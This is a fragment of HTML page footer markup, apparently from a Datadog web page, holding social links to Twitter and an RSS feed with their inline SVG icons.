      <ul class="flex items-center gap-5">
        
          <li class="navbar-menu-item navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3 ">
  <a href="https://www.twitter.com/datadoghq/" title="twitter" class="navbar-menu-link" data-custom-name="Social link">
    <span class="sr-only">twitter</span>
    
      <svg class="navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3"  width="32" height="26" viewBox="0 0 32 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M32 3.06847C30.8011 3.59032 29.53 3.92736 28.23 4.06809C29.6028 3.25017 30.6302 1.96012 31.12 0.439486C29.8487 1.21147 28.4556 1.7624 27 2.06886C26.1024 1.09132 24.9296 0.408504 23.6362 0.11034C22.3427 -0.187824 20.9892 -0.0873454 19.754 0.398541C18.5188 0.884427 17.4598 1.73293 16.7165 2.83228C15.9732 3.93163 15.5804 5.23027 15.59 6.55713C15.5899 7.06175 15.6469 7.56476 15.76 8.05656C13.1501 7.92429 10.5972 7.24554 8.26644 6.06426C5.9357 4.88298 3.87916 3.22551 2.23 1.19919C1.64381 2.19953 1.33648 3.33861 1.34 4.49792C1.33386 5.58425 1.5974 6.65514 2.10701 7.61464C2.61661 8.57415 3.35637 9.3923 4.26 9.99581C3.20814 9.97087 2.1783 9.68949 1.26 9.17613V9.25609C1.25956 10.7709 1.78297 12.2393 2.74158 13.4125C3.70019 14.5857 5.03504 15.3916 6.52 15.6936C5.95613 15.8468 5.37433 15.9241 4.79 15.9235C4.37705 15.9242 3.96504 15.884 3.56 15.8036C3.97753 17.1081 4.79325 18.2493 5.89266 19.0668C6.99208 19.8843 8.31998 20.3372 9.69 20.3618C7.36206 22.1863 4.48815 23.1756 1.53 23.1707C1.01794 23.1565 0.507113 23.1132 0 23.0408C2.9985 24.9733 6.49229 25.9975 10.06 25.9897C22.14 25.9897 28.74 15.9935 28.74 7.31684C28.74 7.03695 28.74 6.74706 28.74 6.46717C30.0214 5.53848 31.1256 4.38732 32 3.06847Z"/>
</svg>

    
  </a>
</li>
        
          <li class="navbar-menu-item navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3 ">
  <a href="/rss/feed.xml" title="rss" class="navbar-menu-link" data-custom-name="Social link">
    <span class="sr-only">rss</span>
    
      <svg class="navbar-menu-item-social fill-white hover:fill-purple active:fill-purple-3"  version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 192 192" style="enable-background:new 0 0 192 192;" xml:space="preserve">
  <path class="st0" d="M136,154h-16c0-45.21-36.79-82-82-82V56C92.04,56,136,99.96,136,154z"/>
  <path class="st0" d="M96,154H80c0-23.16-18.84-42-42-42V96C69.98,96,96,122.02,96,154z"/>
  <path class="st0" d="M176,154h-16c0-67.27-54.73-122-122-122V16C114.09,16,176,77.91,176,154z"/>
  <circle class="st0" cx="38" cy="154" r="18"/>
</svg>

    
  </a>
</li>
        
      </ul>
    </nav>
  </div>
</footer>
  </body>
</html>
